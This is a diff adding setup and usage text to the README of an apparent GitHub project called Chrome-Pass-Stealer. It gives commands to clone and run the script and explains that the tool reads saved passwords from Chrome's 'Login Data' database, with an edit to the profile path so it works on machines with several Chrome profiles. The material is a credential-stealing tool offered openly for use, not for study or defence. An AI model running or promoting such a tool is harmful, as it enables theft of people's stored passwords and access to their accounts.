@@ -22,4 +22,22 @@ pip install pysqlite3
 pip install pywin32                                                                                                                                         
 pip install pycrypto                                                                                                                                       
 pip install pytest-shutil                                                                                                                                   
-git clone 
+git clone https://github.com/kunalmannu/Chrome-Pass-Stealer.git
+cd Chrome-Pass-Stealer
+python3 chrome-pass-stealer.py
+
+# Idea
+So Guyz On Day I Was Working On Stealing Browser's Saved Password
+And Then I Noticed A Problem That I Was Not Able To Get The Data
+So I Searched The Problem And Found Out That The Reason Was That I Had
+Multiple Profiles And Hence It Was Not Working. So This Repo 
+Is Basically For The People Who Have Multiple Profiles In Chrome.
+You Can Change The Profile Number By Going To The Line
+
+63    db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local",
+64                           "Google", "Chrome", "User Data", ["Profile 1"], "Login Data")
+                                                                    ^
+                                                                Edit This And Also Dont Put The Brackets It's Just For Reference
+
+
+# Thank You
